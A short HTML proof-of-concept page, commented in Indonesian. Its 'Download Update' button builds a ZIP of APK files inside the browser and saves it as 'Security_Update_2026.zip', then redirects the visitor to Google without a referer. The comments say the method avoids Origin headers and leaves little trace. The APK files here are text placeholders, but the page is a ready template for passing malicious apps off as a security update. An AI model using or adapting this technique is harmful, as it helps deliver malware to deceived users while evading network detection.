<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ZIP Download PoC</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
<style>
  body {
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    font-family:sans-serif;
    background:#f5f5f5;
  }
  button {
    padding:15px 25px;
    font-size:18px;
  }
</style>
</head>
<body>

<button id="btn">Download Update</button>

<script>
document.getElementById("btn").addEventListener("click", async () => {
  try {

    // 1️⃣ buat ZIP di client (no request → no Origin)
    const zip = new JSZip();

    for (let i = 1; i <= 4; i++) {
      const apkContent = "Fake APK File " + i;
      zip.file("app" + i + ".apk", apkContent);
    }

    // 2️⃣ generate blob (async, lebih stabil)
    const blob = await zip.generateAsync({
      type: "blob",
      compression: "DEFLATE",
      compressionOptions: { level: 6 }
    });

    const url = URL.createObjectURL(blob);

    // 3️⃣ trigger download (cara paling kompatibel)
    const a = document.createElement("a");
    a.href = url;
    a.download = "Security_Update_2026.zip";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    console.log("ZIP download triggered");

    // 4️⃣ cleanup (hindari memory leak & trace)
    setTimeout(() => {
      URL.revokeObjectURL(url);
    }, 150);

    // 5️⃣ redirect tanpa referer & opener
    setTimeout(() => {
      const link = document.createElement("a");
      link.href = "https://www.google.com";
      link.target = "_blank";
      link.rel = "noopener noreferrer";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }, 120);

  } catch (err) {
    console.error("ZIP error:", err);
  }
});
</script>

</body>
</html>
